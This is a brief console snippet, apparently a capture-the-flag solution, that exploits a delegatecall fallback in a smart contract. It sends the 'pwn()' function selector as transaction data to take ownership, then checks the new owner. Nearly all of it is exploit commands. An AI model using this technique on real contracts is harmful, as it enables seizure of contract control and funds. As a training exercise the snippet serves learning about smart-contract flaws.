# owner of contract 
await contract.owner()

# call delegegate function via fallback with direct function id of the 'pwn()' function
sendTransaction({from:"0x5Fb17f13465950ED8726f7ECE8CBA3dFB37566aF",to:contract.address, data:"0xdd365b8b"})

# chech the new owner
await contract.owner()
